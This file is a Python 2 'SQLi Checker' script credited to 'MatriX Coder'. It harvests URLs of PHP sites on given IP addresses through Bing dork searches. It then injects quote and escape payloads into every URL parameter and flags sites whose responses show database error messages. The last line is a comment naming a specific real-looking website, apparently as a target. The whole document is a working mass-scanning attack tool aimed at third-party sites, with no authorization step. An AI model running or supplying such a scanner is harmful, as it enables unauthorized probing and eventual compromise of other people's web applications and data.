#!/usr/bin/python
# -*- coding: utf-8 -*-

import urllib2 , os , sys , re
from platform import system

class colors():
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    DARKCYAN = '\033[36m'
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    ENDC = '\033[0m'

if system() == 'Linux':
    os.system('clear')
if system() == 'Windows':
    os.system('cls')

logo = '''
   _____ ____    __    _
  / ___// __ \  / /   (_) | ----| SQLi Checker |----
  \__ \/ / / / / /   / /  | Autohr : MatriX Coder
 ___/ / /_/ / / /___/ /   | FB : www.fb.com/matrixcoder2
/____/\___\_\/_____/_/    | Blog : www.matrixcoder.co.vu


'''

print(colors.BLUE + logo + colors.ENDC)

def unique(seq):
	##################################################
	####    getting unique elements in  a list    ####
	##################################################
	seen = set()
	return [seen.add(x) or x for x in seq if x not in seen]

class Sqli :

	def __init__(self, ip):
		self.ip = ip
		self.bingGrabebr()

	def bingGrabebr(self) :
		###########################################################
		####    grabbing all urls from a simple bing search    ####
		####           with "id=" dork sends to scan           ####
		###########################################################
		page = 1
		lista = []
		while page <= 101:
			try:
				bing = "http://www.bing.com/search?q=ip%3A" + self.ip + "+php?id=&count=50&first=" + str(page)
				openbing = urllib2.urlopen(bing)
				readbing = openbing.read()
				findwebs = re.findall('<h2><a href="(.*?)"', readbing)
				for i in range(len(findwebs)):
					x = findwebs[i]
					lista.append(x)

			except:
				pass

			page += 50
		
		self.lista = lista
		self.testSqli()

	def testSqli(self) :
	    payloads = ["3'", "3%5c", "3%27%22%28%29", "3'><"]
	    check = re.compile("Incorrect syntax|mysql_fetch|Syntax error|Unclosed.+mark|unterminated.+qoute|SQL.+Server|Microsoft.+Database|Fatal.+error", re.I)
	    for site in self.lista :
			try:
				for param in site.split('?')[1].split('&'):
					for payload in payloads:
							pows = site.replace(param , param + payload.strip())
							print pows
							html = urllib2.urlopen(pows).readlines()
							for line in html:
								checker = re.findall(check , line)
								if len(checker) != 0 :
									print colors.GREEN + '\nSQLi Found ==> %s\n' % site + colors.ENDC
			except : 
				pass
try :
	with open(sys.argv[1], 'r') as f :
		ips = f.readlines()
	for ip in ips :
		ip = ip.rstrip()
		Sqli(ip)
except IndexError:
    print "[*] Usage : python "+sys.argv[0]+" file.txt"
#http://www.lesblaguesdetoto.com/index.php?rub=actualites